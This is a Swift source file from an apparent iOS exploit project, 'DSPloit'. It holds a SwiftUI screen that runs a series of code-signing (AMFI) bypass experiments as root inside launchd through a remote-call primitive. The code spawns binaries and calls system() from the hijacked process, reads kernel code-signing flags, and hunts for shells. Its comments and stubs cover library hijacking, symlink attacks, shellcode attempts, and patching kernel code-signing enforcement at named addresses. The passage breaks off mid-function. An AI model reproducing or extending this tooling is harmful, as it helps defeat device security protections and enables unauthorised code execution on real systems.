//
//  AMFIExperimentView.swift
//  DSPloit
//
//  AMFI Bypass Experiments — test binary execution from root context
//  Goal: find a way to execute unsigned binaries
//

import SwiftUI

struct AMFIExperimentView: View {
    @ObservedObject private var root = RootExecutor.shared
    @ObservedObject private var mgr = dspmgr.shared
    
    @State private var results: [ExperimentResult] = []
    @State private var isRunning = false
    @State private var customBinary = "/usr/bin/id"
    
    struct ExperimentResult: Identifiable {
        let id = UUID()
        let name: String
        let success: Bool
        let detail: String
        let timestamp: Date
    }
    
    var body: some View {
        List {
            // Info
            Section {
                VStack(alignment: .leading, spacing: 6) {
                    Text("AMFI blocks unsigned binary execution even as root.")
                        .font(.caption)
                    Text("These experiments test different spawn methods to find what works.")
                        .font(.caption)
                        .foregroundStyle(.secondary)
                }
            } header: {
                Label("About", systemImage: "info.circle")
            }
            
            // Experiments
            Section {
                Button(action: runAllExperiments) {
                    Label("Run All Experiments", systemImage: "play.circle.fill")
                        .foregroundStyle(.red)
                }
                .disabled(isRunning || !mgr.rcready)
                
                Button(action: { testSingleBinary(customBinary) }) {
                    Label("Test Custom Binary", systemImage: "terminal")
                }
                .disabled(isRunning || !mgr.rcready)
                
                TextField("Binary path", text: $customBinary)
                    .font(.system(.caption, design: .monospaced))
            } header: {
                Label("Experiments", systemImage: "flask")
            }
            
            // Results
            if !results.isEmpty {
                Section {
                    ForEach(results) { r in
                        VStack(alignment: .leading, spacing: 4) {
                            HStack {
                                Image(systemName: r.success ? "checkmark.circle.fill" : "xmark.circle.fill")
                                    .foregroundStyle(r.success ? .green : .red)
                                Text(r.name)
                                    .font(.caption.bold())
                            }
                            Text(r.detail)
                                .font(.system(size: 10, design: .monospaced))
                                .foregroundStyle(.secondary)
                                .textSelection(.enabled)
                        }
                        .padding(.vertical, 2)
                    }
                } header: {
                    Label("Results (\(results.count))", systemImage: "list.bullet")
                }
            }
        }
        .navigationTitle("AMFI Experiments")
        .navigationBarTitleDisplayMode(.inline)
    }
    
    // MARK: - Run All Experiments
    
    private func runAllExperiments() {
        isRunning = true
        results.removeAll()
        
        #if !DISABLE_REMOTECALL
        root.executeAsRoot(operation: "amfi_experiments") { rc in
            var experimentResults: [ExperimentResult] = []
            
            // ============================================
            // Experiment 1: posix_spawn system binary
            // ============================================
            let exp1 = self.expPosixSpawn(rc: rc, binary: "/usr/bin/id", name: "posix_spawn /usr/bin/id")
            experimentResults.append(exp1)
            
            // ============================================
            // Experiment 2: posix_spawn /bin/sh
            // ============================================
            let exp2 = self.expPosixSpawn(rc: rc, binary: "/bin/sh", name: "posix_spawn /bin/sh")
            experimentResults.append(exp2)
            
            // ============================================
            // Experiment 3: posix_spawn /bin/ls
            // ============================================
            let exp3 = self.expPosixSpawn(rc: rc, binary: "/bin/ls", name: "posix_spawn /bin/ls")
            experimentResults.append(exp3)
            
            // ============================================
            // Experiment 4: fork() from launchd
            // ============================================
            let exp4 = self.expFork(rc: rc)
            experimentResults.append(exp4)
            
            // ============================================
            // Experiment 5: system() call
            // ============================================
            let exp5 = self.expSystem(rc: rc)
            experimentResults.append(exp5)
            
            // ============================================
            // Experiment 6: execve directly
            // ============================================
            let exp6 = self.expExecve(rc: rc)
            experimentResults.append(exp6)
            
            // ============================================
            // Experiment 7: Check cs_flags of launchd
            // ============================================
            let exp7 = self.expCheckCSFlags(rc: rc)
            experimentResults.append(exp7)
            
            // ============================================
            // Experiment 8: posix_spawnattr with flags
            // ============================================
            let exp8 = self.expPosixSpawnAttr(rc: rc)
            experimentResults.append(exp8)
            
            // ============================================
            // Experiment 9: PATH VARIANTS — the key test!
            // ret=2 means ENOENT (not found), so try different paths
            // ============================================
            let pathVariants = [
                "/private/var/bin/id",
                "/private/usr/bin/id",
                "/System/usr/bin/id",
                "/usr/local/bin/id",
            ]
            for path in pathVariants {
                let exp = self.expPosixSpawn(rc: rc, binary: path, name: "spawn \(path)")
                experimentResults.append(exp)
            }
            
            // ============================================
            // Experiment 10: Check what launchd sees as root filesystem
            // ============================================
            let exp10 = self.expCheckRootFS(rc: rc)
            experimentResults.append(exp10)
            
            // ============================================
            // Experiment 11: stat() binaries to check they exist
            // ============================================
            let exp11 = self.expStatBinaries(rc: rc)
            experimentResults.append(exp11)
            
            // ============================================
            // Experiment 12: Try fork+execve pattern
            // ============================================
            let exp12 = self.expForkExec(rc: rc)
            experimentResults.append(exp12)
            
            // ============================================
            // Experiment 13: Scan directories for existing binaries
            // ============================================
            let exp13 = self.expScanBinaries(rc: rc)
            experimentResults.append(exp13)
            
            // ============================================
            // Experiment 14: Try spawn binaries that exist
            // ============================================
            let exp14 = self.expSpawnExisting(rc: rc)
            experimentResults.append(exp14)
            
            // ============================================
            // Experiment 15: Scan cryptex paths for shell
            // ============================================
            let exp15 = self.expScanCryptex(rc: rc)
            experimentResults.append(exp15)
            
            // ============================================
            // Experiment 16: Spawn /bin/ps with output capture
            // ============================================
            let exp16 = self.expSpawnWithOutput(rc: rc, binary: "/bin/ps", args: ["ps"])
            experimentResults.append(exp16)
            
            // ============================================
            // Experiment 17: Spawn /bin/df with output capture
            // ============================================
            let exp17 = self.expSpawnWithOutput(rc: rc, binary: "/bin/df", args: ["df", "-h"])
            experimentResults.append(exp17)
            
            // ============================================
            // Experiment 18: List cryptex directory contents
            // ============================================
            let exp18 = self.expListCryptexDirs(rc: rc)
            experimentResults.append(exp18)
            
            // ============================================
            // Experiment 19: Verify posix_spawn return value
            // (is ret=0 from posix_spawn or from RC wrapper?)
            // ============================================
            let exp19 = self.expVerifySpawnReturn(rc: rc)
            experimentResults.append(exp19)
            
            // ============================================
            // Experiment 20: Fix PID + spawn with pipe for output
            // ============================================
            let exp20 = self.expSpawnWithPipe(rc: rc)
            experimentResults.append(exp20)
            
            // ============================================
            // Experiment 21: Scan cryptex usr/libexec contents
            // ============================================
            let exp21 = self.expScanCryptexLibexec(rc: rc)
            experimentResults.append(exp21)
            
            // ============================================
            // AMFI BYPASS RESEARCH
            // ============================================
            
            // Experiment 22: Write binary + try spawn (test AMFI on new file)
            let exp22 = self.expWriteAndSpawn(rc: rc)
            experimentResults.append(exp22)
            
            // Experiment 23: dlopen unsigned dylib in launchd
            let exp23 = self.expDlopen(rc: rc)
            experimentResults.append(exp23)
            
            // Experiment 24: Check AMFI-related kernel state
            let exp24 = self.expAMFIState(rc: rc)
            experimentResults.append(exp24)
            
            // ============================================
            // CORETRUST / LIBRARY HIJACK RESEARCH
            // ============================================
            
            // Experiment 25: Try overwrite signed library with custom code
            let exp25 = self.expLibraryHijack(rc: rc)
            experimentResults.append(exp25)
            
            // Experiment 26: Try symlink attack on library path
            let exp26 = self.expSymlinkAttack(rc: rc)
            experimentResults.append(exp26)
            
            // Experiment 27: Try dlopen with RTLD_NOLOAD + function pointer swap
            let exp27 = self.expFunctionSwap(rc: rc)
            experimentResults.append(exp27)
            
            // ============================================
            // SHELLCODE EXECUTION — DISABLED (causes PAC panic on A12+)
            // mmap RWX works but jumping to unsigned pointer = PAC violation
            // Need PAC signing gadget to make this work
            // ============================================
            experimentResults.append(ExperimentResult(
                name: "shellcode (DISABLED)",
                success: false,
                detail: "⚠️ Disabled — causes kernel panic on A12+\nmmap RWX works (0xbf2014000) but APRR blocks execution from mmap'd pages.\nNeed: write to existing executable page or find JIT bypass.",
                timestamp: Date()
            ))
            
            // ============================================
            // Experiment 28: Find writable+executable page in launchd
            // ============================================
            let exp28 = self.expFindWritableCodePage(rc: rc)
            experimentResults.append(exp28)
            
            // ============================================
            // Experiment 28b: SHELLCODE — DISABLED (APRR panic confirmed)
            // mprotect returns success but HARDWARE blocks execution
            // APRR enforces W^X at silicon level — no software bypass
            // ============================================
            experimentResults.append(ExperimentResult(
                name: "⚡ SHELLCODE (DISABLED)",
                success: false,
                detail: "⚠️ DISABLED — confirmed APRR panic\nmprotect(RWX) succeeds in software but ARM APRR hardware\nblocks execution from any page that was ever writable.\nNo software bypass possible on A12+.\n\nRemaining path: fork→RC→execve (no shellcode needed)",
                timestamp: Date()
            ))
            
            // ============================================
            // Experiment 29: Fork + keep child alive + RC to child
            // ============================================
            let exp29 = self.expForkAndConnect(rc: rc)
            experimentResults.append(exp29)
            
            // ============================================
            // Experiment 30: RELIABLE spawn test (isolated, extra wait)
            // Reproduce the EXACT pattern that gave 1795 chars output
            // ============================================
            let exp30 = self.expReliableSpawn(rc: rc)
            experimentResults.append(exp30)
            
            // ============================================
            // Experiment 31: Call launchd's job_submit internal API
            // We ARE launchd — call our own job loading function!
            // ============================================
            let exp31 = self.expLaunchdJobSubmit(rc: rc)
            experimentResults.append(exp31)
            
            // ============================================
            // Experiment 32: posix_spawn with POSIX_SPAWN_SETPGROUP
            // Different spawn flags that might affect AMFI behavior
            // ============================================
            let exp32 = self.expSpawnFlags(rc: rc)
            experimentResults.append(exp32)
            
            // ============================================
            // Experiment 33: PROVE execution by creating a file
            // Spawn process that CREATES a file (not stdout)
            // ============================================
            let exp33 = self.expProveByFile(rc: rc)
            experimentResults.append(exp33)
            
            // ============================================
            // Experiment 34: pipe() + dup2 before spawn
            // ============================================
            let exp34 = self.expPipeBeforeSpawn(rc: rc)
            experimentResults.append(exp34)
            
            // ============================================
            // Experiment 35: Spawn from SPRINGBOARD context
            // ============================================
            let exp35 = self.expSpawnFromSpringBoard()
            experimentResults.append(exp35)
            
            // ============================================
            // Experiment 36: Fix output via KERNEL fd table manipulation
            // Directly modify child's fd[1] in kernel to point to our file
            // ============================================
            let exp36 = self.expKernelFdRedirect(rc: rc)
            experimentResults.append(exp36)
            
            // ============================================
            // Experiment 37: GPU shader code execution research
            // GPU is NOT subject to APRR/PAC — can execute arbitrary code!
            // ============================================
            let exp37 = self.expGPUResearch(rc: rc)
            experimentResults.append(exp37)
            
            // ============================================
            // Experiment 38: Multiple spawn attempts (REDUCED to 2)
            // ============================================
            let exp38 = self.expMultipleSpawns(rc: rc)
            experimentResults.append(exp38)
            
            // ============================================
            // Experiment 39: Kernel fd — DISABLED (causes panic)
            // ============================================
            experimentResults.append(ExperimentResult(
                name: "kernel fd (DISABLED)",
                success: false,
                detail: "⚠️ Disabled — fd table in inaccessible kernel zone.",
                timestamp: Date()
            ))
            
            // ============================================
            // 🔥 Experiment 40: PATCH pmap_cs_allow_invalid_internal!
            // ============================================
            let exp40 = self.expPatchCSEnforcement(rc: rc)
            experimentResults.append(exp40)
            
            // ============================================
            // 🔥🔥 Experiment 41: cs_enforcement_disable — DISABLED
            // ============================================
            experimentResults.append(ExperimentResult(
                name: "🔥🔥 CS_ENFORCEMENT (prev: DISABLED)",
                success: false,
                detail: "Previous attempt wrote to wrong address → panic.\nNew target found via code tracing: 0xfffffff00a3304e8",
                timestamp: Date()
            ))
            
            // ============================================
            // 🔥 Experiment 42: SAFE READ of cs_enforcement candidate
            // Only READ — no write! Verify address is accessible first.
            // ============================================
            let exp42 = self.expSafeReadCSVar(rc: rc)
            experimentResults.append(exp42)
            
            DispatchQueue.main.async {
                self.results = experimentResults
                self.isRunning = false
            }
            
            let successCount = experimentResults.filter { $0.success }.count
            return (successCount > 0, "\(successCount)/\(experimentResults.count) succeeded", UInt64(successCount))
        }
        #endif
    }
    
    private func testSingleBinary(_ path: String) {
        isRunning = true
        
        #if !DISABLE_REMOTECALL
        root.executeAsRoot(operation: "test_binary") { rc in
            let result = self.expPosixSpawn(rc: rc, binary: path, name: "posix_spawn \(path)")
            DispatchQueue.main.async {
                self.results.insert(result, at: 0)
                self.isRunning = false
            }
            return (result.success, result.detail, 0)
        }
        #endif
    }
    
    // MARK: - Experiment Implementations
    
    #if !DISABLE_REMOTECALL
    /// Experiment: posix_spawn a binary
    private func expPosixSpawn(rc: RemoteCall, binary: String, name: String) -> ExperimentResult {
        let mem = rc.trojanMem
        let binAddr = remote_alloc_str(rc, binary)
        
        // argv = [binary, NULL]
        let argvBase = mem + 0x400
        rc[argvBase].setValue64(binAddr)
        rc[argvBase + 8].setValue64(0)
        
        // pid output
        let pidAddr = mem + 0x300
        rc[pidAddr].setValue32(0)
        
        // posix_spawn(&pid, binary, NULL, NULL, argv, NULL)
        let ret = RootExecutor.rcall(rc, "posix_spawn", pidAddr, binAddr, 0, 0, argvBase, 0)
        let pid = rc[pidAddr].value32()
        
        // If spawned, wait for it
        if ret == 0 && pid != 0 {
            let statusAddr = mem + 0x380
            rc[statusAddr].setValue32(0)
            RootExecutor.rcall(rc, "waitpid", UInt64(pid), statusAddr, 0)
            let exitStatus = rc[statusAddr].value32()
            
            RootExecutor.rcall(rc, "free", binAddr)
            return ExperimentResult(
                name: name,
                success: true,
                detail: "✅ PID=\(pid), exit=\(exitStatus >> 8), ret=\(ret)",
                timestamp: Date()
            )
        }
        
        // Failed — get errno
        let err = remote_errno(rc)
        RootExecutor.rcall(rc, "free", binAddr)
        return ExperimentResult(
            name: name,
            success: false,
            detail: "❌ ret=\(ret), errno=\(err), pid=\(pid)",
            timestamp: Date()
        )
    }
    
    /// Experiment: fork() from launchd
    private func expFork(rc: RemoteCall) -> ExperimentResult {
        let pid = RootExecutor.rcall(rc, "fork")
        
        if pid == 0 {
            // We're in child — this shouldn't happen in RC context
            return ExperimentResult(name: "fork()", success: true, detail: "In child process!", timestamp: Date())
        } else if pid != UInt64(bitPattern: -1) {
            // Parent got child PID
            // Wait for child
            let mem = rc.trojanMem
            let statusAddr = mem + 0x380
            RootExecutor.rcall(rc, "waitpid", pid, statusAddr, 0)
            return ExperimentResult(name: "fork()", success: true, detail: "✅ Child PID=\(pid)", timestamp: Date())
        } else {
            let err = remote_errno(rc)
            return ExperimentResult(name: "fork()", success: false, detail: "❌ fork failed: errno=\(err)", timestamp: Date())
        }
    }
    
    /// Experiment: system() call
    private func expSystem(rc: RemoteCall) -> ExperimentResult {
        let cmdAddr = remote_alloc_str(rc, "id > /tmp/.dsploit_amfi_test 2>&1")
        let ret = RootExecutor.rcall(rc, "system", cmdAddr)
        RootExecutor.rcall(rc, "free", cmdAddr)
        
        // Try to read output
        let outAddr = remote_alloc_str(rc, "/tmp/.dsploit_amfi_test")
        let fd = RootExecutor.rcall(rc, "open", outAddr, UInt64(O_RDONLY), 0)
        var output = ""
        
        if fd != UInt64(bitPattern: -1) {
            let bufAddr = rc.trojanMem + 0x800
            let n = RootExecutor.rcall(rc, "read", fd, bufAddr, 500)
            if n > 0 && n < 501 {
                var buf = [UInt8](repeating: 0, count: Int(n))
                rc.remoteRead(bufAddr, to: &buf, size: n)
                output = String(bytes: buf, encoding: .utf8) ?? ""
            }
            RootExecutor.rcall(rc, "close", fd)
            RootExecutor.rcall(rc, "unlink", outAddr)
        }
        RootExecutor.rcall(rc, "free", outAddr)
        
        let success = ret == 0 && !output.isEmpty
        return ExperimentResult(
            name: "system(\"id\")",
            success: success,
            detail: success ? "✅ ret=\(ret), output: \(output.prefix(80))" : "❌ ret=\(ret) (0x\(String(format: "%x", ret)))",
            timestamp: Date()
        )
    }
    
    /// Experiment: check cs_flags of launchd
    private func expCheckCSFlags(rc: RemoteCall) -> ExperimentResult {
        // Read our (launchd's) proc cs_flags via kernel
        let pid = RootExecutor.rcall(rc, "getpid")
        let csflags = mgr.readCSFlags(pid: Int32(pid))
        let procFlags = mgr.readProcFlags(pid: Int32(pid))
        
        // CS flag meanings
        var flagStr = "cs_flags=0x\(String(format: "%x", csflags)): "
        if csflags & 0x0000001 != 0 { flagStr += "VALID " }
        if csflags & 0x0000004 != 0 { flagStr += "HARD " }
        if csflags & 0x0000008 != 0 { flagStr += "KILL " }
        if csflags & 0x0000100 != 0 { flagStr += "PLATFORM " }
        if csflags & 0x0000800 != 0 { flagStr += "DEBUGGED " }
        if csflags & 0x0004000 != 0 { flagStr += "GET_TASK_ALLOW " }
        if csflags & 0x0020000 != 0 { flagStr += "INSTALLER " }
        
        return ExperimentResult(
            name: "launchd cs_flags",
            success: true,
            detail: "PID=\(pid), \(flagStr)\np_flag=0x\(String(format: "%x", procFlags))",
            timestamp: Date()
        )
    }
    
    /// Experiment: posix_spawn with special attributes
    private func expPosixSpawnAttr(rc: RemoteCall) -> ExperimentResult {
        let mem = rc.trojanMem
        
        // Allocate posix_spawnattr_t in remote memory
        let attrAddr = mem + 0x200
        
        // posix_spawnattr_init(&attr)
        RootExecutor.rcall(rc, "posix_spawnattr_init", attrAddr)
        
        // Set flags: POSIX_SPAWN_START_SUSPENDED (0x0080)
        // This might help bypass some checks
        let flags: UInt64 = 0x0080 // POSIX_SPAWN_START_SUSPENDED
        RootExecutor.rcall(rc, "posix_spawnattr_setflags", attrAddr, flags)
        
        // Try spawn /usr/bin/id with attributes
        let binAddr = remote_alloc_str(rc, "/usr/bin/id")
        let argvBase = mem + 0x400
        rc[argvBase].setValue64(binAddr)
        rc[argvBase + 8].setValue64(0)
        
        let pidAddr = mem + 0x300
        rc[pidAddr].setValue32(0)
        
        // posix_spawn(&pid, binary, NULL, &attr, argv, NULL)
        let ret = RootExecutor.rcall(rc, "posix_spawn", pidAddr, binAddr, 0, attrAddr, argvBase, 0)
        let pid = rc[pidAddr].value32()
        
        // Cleanup
        RootExecutor.rcall(rc, "posix_spawnattr_destroy", attrAddr)
        RootExecutor.rcall(rc, "free", binAddr)
        
        if ret == 0 && pid != 0 {
            // Resume the suspended process
            RootExecutor.rcall(rc, "kill", UInt64(pid), 18) // SIGCONT
            // Wait
            let statusAddr = mem + 0x380
            RootExecutor.rcall(rc, "waitpid", UInt64(pid), statusAddr, 0)
            
            return ExperimentResult(
                name: "posix_spawn + SUSPENDED",
                success: true,
                detail: "✅ PID=\(pid), spawned with START_SUSPENDED",
                timestamp: Date()
            )
        }
        
        let err = remote_errno(rc)
        return ExperimentResult(
            name: "posix_spawn + SUSPENDED",
            success: false,
            detail: "❌ ret=\(ret), errno=\(err)",
            timestamp: Date()
        )
    }
    
    /// Experiment: execve (replaces current process — DANGEROUS for launchd!)
    /// We DON'T actually call execve on launchd — that would kill it
    /// Instead we just check if the binary is accessible
    private func expExecve(rc: RemoteCall) -> ExperimentResult {
        // Don't actually execve in launchd! Just check access
        let binAddr = remote_alloc_str(rc, "/usr/bin/id")
        let accessResult = RootExecutor.rcall(rc, "access", binAddr, 1) // X_OK = 1
        RootExecutor.rcall(rc, "free", binAddr)
        
        let canExec = accessResult == 0
        return ExperimentResult(
            name: "access(/usr/bin/id, X_OK)",
            success: canExec,
            detail: canExec ? "✅ Binary is executable (access check passed)" : "❌ Not executable: errno=\(remote_errno(rc))",
            timestamp: Date()
        )
    }
    
    /// Experiment: Check root filesystem from launchd's perspective
    private func expCheckRootFS(rc: RemoteCall) -> ExperimentResult {
        // getcwd to see launchd's working directory
        let bufAddr = rc.trojanMem + 0xC00
        RootExecutor.rcall(rc, "getcwd", bufAddr, 1024)
        var cwdBuf = [UInt8](repeating: 0, count: 256)
        rc.remoteRead(bufAddr, to: &cwdBuf, size: 256)
        let cwd = String(cString: cwdBuf + [0])
        
        // stat /usr/bin to check if it exists
        let statAddr = rc.trojanMem + 0x800
        let usrBinAddr = remote_alloc_str(rc, "/usr/bin")
        let statResult = RootExecutor.rcall(rc, "stat", usrBinAddr, statAddr)
        RootExecutor.rcall(rc, "free", usrBinAddr)
        
        // stat /bin
        let binAddr = remote_alloc_str(rc, "/bin")
        let binStat = RootExecutor.rcall(rc, "stat", binAddr, statAddr)
        RootExecutor.rcall(rc, "free", binAddr)
        
        // readlink /usr/bin (might be symlink)
        let linkBuf = rc.trojanMem + 0xD00
        let linkTarget = remote_alloc_str(rc, "/usr/bin")
        let linkLen = RootExecutor.rcall(rc, "readlink", linkTarget, linkBuf, 256)
        var linkStr = ""
        if linkLen > 0 && linkLen < 256 {
            var lbuf = [UInt8](repeating: 0, count: Int(linkLen))
            rc.remoteRead(linkBuf, to: &lbuf, size: linkLen)
            linkStr = String(bytes: lbuf, encoding: .utf8) ?? ""
        }
        RootExecutor.rcall(rc, "free", linkTarget)
        
        let detail = """
        cwd: \(cwd)
        stat /usr/bin: \(statResult == 0 ? "EXISTS" : "MISSING (errno=\(remote_errno(rc)))")
        stat /bin: \(binStat == 0 ? "EXISTS" : "MISSING")
        readlink /usr/bin: \(linkStr.isEmpty ? "(not a symlink)" : linkStr)
        """
        
        return ExperimentResult(name: "rootfs check", success: true, detail: detail, timestamp: Date())
    }
    
    /// Experiment: stat individual binaries
    private func expStatBinaries(rc: RemoteCall) -> ExperimentResult {
        let binaries = ["/usr/bin/id", "/bin/sh", "/bin/ls", "/sbin/mount", "/usr/sbin/sysctl"]
        var results: [String] = []
        
        let statAddr = rc.trojanMem + 0x800
        for bin in binaries {
            let pathAddr = remote_alloc_str(rc, bin)
            let ret = RootExecutor.rcall(rc, "stat", pathAddr, statAddr)
            results.append("\(bin): \(ret == 0 ? "✅ exists" : "❌ missing")")
            RootExecutor.rcall(rc, "free", pathAddr)
        }
        
        let allExist = !results.contains(where: { $0.contains("❌") })
        return ExperimentResult(
            name: "stat binaries",
            success: allExist,
            detail: results.joined(separator: "\n"),
            timestamp: Date()
        )
    }
    
    /// Experiment: fork() then execve in child
    /// This is the classic Unix pattern: fork → child calls execve
    /// Since fork works, maybe execve in the CHILD works too
    private func expForkExec(rc: RemoteCall) -> ExperimentResult {
        let childPid = RootExecutor.rcall(rc, "fork")
        
        if childPid == 0 {
            return ExperimentResult(name: "fork+exec", success: false, detail: "Unexpected: in child", timestamp: Date())
        }
        
        guard childPid != UInt64(bitPattern: -1) else {
            return ExperimentResult(name: "fork+exec", success: false, detail: "fork failed", timestamp: Date())
        }
        
        let statusAddr = rc.trojanMem + 0x380
        rc[statusAddr].setValue32(0)
        let waitResult = RootExecutor.rcall(rc, "waitpid", childPid, statusAddr, UInt64(WNOHANG))
        let exitStatus = rc[statusAddr].value32()
        
        return ExperimentResult(
            name: "fork+exec",
            success: true,
            detail: "✅ fork PID=\(childPid), wait=\(waitResult), status=0x\(String(format: "%x", exitStatus))\n→ Child exists! Could RC into child then execve",
            timestamp: Date()
        )
    }
    
    /// Experiment: Scan directories for existing binaries
    private func expScanBinaries(rc: RemoteCall) -> ExperimentResult {
        let dirs = ["/sbin", "/usr/sbin", "/usr/libexec", "/usr/bin", "/bin"]
        var found: [String] = []
        let statAddr = rc.trojanMem + 0x800
        
        // Known binaries to check
        let binaries = [
            // /sbin
            "/sbin/mount", "/sbin/umount", "/sbin/reboot", "/sbin/halt",
            "/sbin/fsck", "/sbin/launchd", "/sbin/pfctl", "/sbin/ifconfig",
            "/sbin/route", "/sbin/nologin", "/sbin/ping",
            // /usr/sbin
            "/usr/sbin/sysctl", "/usr/sbin/chown", "/usr/sbin/notifyd",
            "/usr/sbin/cfprefsd", "/usr/sbin/mediaserverd", "/usr/sbin/BTServer",
            "/usr/sbin/wirelessproxd", "/usr/sbin/mDNSResponder",
            // /usr/libexec
            "/usr/libexec/xpcproxy", "/usr/libexec/trustd", "/usr/libexec/amfid",
            "/usr/libexec/keybagd", "/usr/libexec/securityd", "/usr/libexec/lsd",
            "/usr/libexec/backboardd", "/usr/libexec/SpringBoard",
            "/usr/libexec/installd", "/usr/libexec/lockdownd",
            "/usr/libexec/mobileassetd", "/usr/libexec/ptpd",
            // /usr/bin
            "/usr/bin/id", "/usr/bin/env", "/usr/bin/which", "/usr/bin/printf",
            "/usr/bin/uname", "/usr/bin/whoami", "/usr/bin/sw_vers",
            "/usr/bin/plutil", "/usr/bin/defaults", "/usr/bin/killall",
            "/usr/bin/launchctl", "/usr/bin/log", "/usr/bin/open",
            // /bin
            "/bin/sh", "/bin/bash", "/bin/zsh", "/bin/ls", "/bin/cp",
            "/bin/mv", "/bin/rm", "/bin/cat", "/bin/echo", "/bin/mkdir",
            "/bin/chmod", "/bin/chown", "/bin/kill", "/bin/ps", "/bin/df",
            "/bin/ln", "/bin/pwd", "/bin/date", "/bin/sleep",
        ]
        
        for bin in binaries {
            let pathAddr = remote_alloc_str(rc, bin)
            let ret = RootExecutor.rcall(rc, "stat", pathAddr, statAddr)
            if ret == 0 {
                found.append(bin)
            }
            RootExecutor.rcall(rc, "free", pathAddr)
        }
        
        let detail: String
        if found.isEmpty {
            detail = "No binaries found in standard paths!\niOS 18 moved them to cryptex?"
        } else {
            detail = "Found \(found.count) binaries:\n" + found.joined(separator: "\n")
        }
        
        return ExperimentResult(
            name: "scan binaries (\(binaries.count) checked)",
            success: !found.isEmpty,
            detail: detail,
            timestamp: Date()
        )
    }
    
    /// Experiment: Try to posix_spawn binaries that we know exist
    private func expSpawnExisting(rc: RemoteCall) -> ExperimentResult {
        // First find what exists
        let candidates = ["/sbin/mount", "/usr/libexec/xpcproxy", "/usr/libexec/trustd",
                         "/bin/ps", "/bin/df", "/sbin/launchd"]
        
        let statAddr = rc.trojanMem + 0x800
        var existingBins: [String] = []
        
        for bin in candidates {
            let pathAddr = remote_alloc_str(rc, bin)
            let ret = RootExecutor.rcall(rc, "stat", pathAddr, statAddr)
            if ret == 0 { existingBins.append(bin) }
            RootExecutor.rcall(rc, "free", pathAddr)
        }
        
        if existingBins.isEmpty {
            return ExperimentResult(name: "spawn existing", success: false, detail: "No candidate binaries found", timestamp: Date())
        }
        
        // Try to spawn each existing binary
        var spawnResults: [String] = []
        let mem = rc.trojanMem
        
        for bin in existingBins.prefix(3) {
            let binAddr = remote_alloc_str(rc, bin)
            let argvBase = mem + 0x400
            rc[argvBase].setValue64(binAddr)
            rc[argvBase + 8].setValue64(0) // NULL
            
            // Use a dedicated address for pid output, clear it first
            let pidAddr = mem + 0x2F0
            rc[pidAddr].setValue64(0) // clear 8 bytes
            
            let ret = RootExecutor.rcall(rc, "posix_spawn", pidAddr, binAddr, 0, 0, argvBase, 0)
            
            // Read pid (try both 32-bit and 64-bit)
            let pid32 = rc[pidAddr].value32()
            let pid64 = rc[pidAddr].value64()
            let err = remote_errno(rc)
            
            if ret == 0 {
                // ret=0 means posix_spawn SUCCEEDED!
                // pid might be 0 if it wrote to wrong offset, but spawn worked
                let pidStr = pid32 != 0 ? "PID=\(pid32)" : (pid64 != 0 ? "PID64=\(pid64)" : "PID=? (ret=0!)")
                spawnResults.append("✅ \(bin) → \(pidStr) ret=0 SPAWN SUCCESS!")
                
                // Try to kill if we got a PID
                if pid32 != 0 {
                    RootExecutor.rcall(rc, "kill", UInt64(pid32), 9)
                }
            } else {
                spawnResults.append("❌ \(bin) → ret=\(ret), err=\(err), pid32=\(pid32)")
            }
            
            RootExecutor.rcall(rc, "free", binAddr)
        }
        
        let anySuccess = spawnResults.contains(where: { $0.hasPrefix("✅") })
        return ExperimentResult(
            name: "spawn existing binaries",
            success: anySuccess,
            detail: spawnResults.joined(separator: "\n"),
            timestamp: Date()
        )
    }
    /// Experiment: Scan cryptex/preboot paths for shell and other binaries
    private func expScanCryptex(rc: RemoteCall) -> ExperimentResult {
        let cryptexPaths = [
            // Known cryptex mount points on iOS 16-18
            "/private/preboot/Cryptexes/OS/usr/bin/sh",
            "/private/preboot/Cryptexes/OS/bin/sh",
            "/private/preboot/Cryptexes/OS/usr/bin/id",
            "/private/preboot/Cryptexes/OS/usr/bin/env",
            "/private/preboot/Cryptexes/OS/usr/bin/uname",
            "/private/preboot/Cryptexes/OS/usr/bin/whoami",
            "/private/preboot/Cryptexes/OS/usr/bin/killall",
            "/private/preboot/Cryptexes/OS/usr/bin/launchctl",
            "/private/preboot/Cryptexes/OS/bin/ls",
            "/private/preboot/Cryptexes/OS/bin/cat",
            "/private/preboot/Cryptexes/OS/bin/cp",
            "/private/preboot/Cryptexes/OS/bin/mkdir",
            "/private/preboot/Cryptexes/OS/bin/rm",
            "/private/preboot/Cryptexes/OS/bin/zsh",
            "/private/preboot/Cryptexes/OS/bin/bash",
            // Alternative paths
            "/usr/appleinternal/bin/sh",
            "/private/var/staged_system_apps/sh",
            "/System/Cryptexes/OS/usr/bin/sh",
            "/System/Cryptexes/OS/bin/sh",
            "/System/Cryptexes/OS/usr/bin/id",
            "/System/Cryptexes/OS/bin/ls",
            "/System/Cryptexes/OS/bin/cat",
            "/System/Cryptexes/OS/usr/bin/env",
            "/System/Cryptexes/OS/usr/bin/launchctl",
            // App cryptex
            "/System/Cryptexes/App/usr/bin/sh",
            "/System/Cryptexes/App/bin/sh",
        ]
        
        let statAddr = rc.trojanMem + 0x800
        var found: [String] = []
        
        for path in cryptexPaths {
            let pathAddr = remote_alloc_str(rc, path)
            let ret = RootExecutor.rcall(rc, "stat", pathAddr, statAddr)
            if ret == 0 { found.append(path) }
            RootExecutor.rcall(rc, "free", pathAddr)
        }
        
        // Also scan directories to see what's there
        var dirResults: [String] = []
        let dirsToScan = [
            "/private/preboot/Cryptexes",
            "/private/preboot/Cryptexes/OS",
            "/System/Cryptexes",
            "/System/Cryptexes/OS",
            "/System/Cryptexes/OS/bin",
            "/System/Cryptexes/OS/usr/bin",
        ]
        
        for dir in dirsToScan {
            let dirAddr = remote_alloc_str(rc, dir)
            let dirStat = RootExecutor.rcall(rc, "stat", dirAddr, statAddr)
            dirResults.append("\(dir): \(dirStat == 0 ? "EXISTS" : "MISSING")")
            RootExecutor.rcall(rc, "free", dirAddr)
        }
        
        var detail = "Directories:\n" + dirResults.joined(separator: "\n")
        detail += "\n\nBinaries found: \(found.count)"
        if !found.isEmpty {
            detail += "\n" + found.joined(separator: "\n")
        }
        
        return ExperimentResult(
            name: "cryptex scan (\(cryptexPaths.count) paths)",
            success: !found.isEmpty,
            detail: detail,
            timestamp: Date()
        )
    }
    
    /// Experiment: List contents of cryptex directories using opendir/readdir
    private func expListCryptexDirs(rc: RemoteCall) -> ExperimentResult {
        let dirsToList = [
            "/private/preboot/Cryptexes/OS",
            "/System/Cryptexes/OS",
            "/System/Cryptexes",
            "/private/preboot/Cryptexes",
        ]
        
        var allResults: [String] = []
        
        for dir in dirsToList {
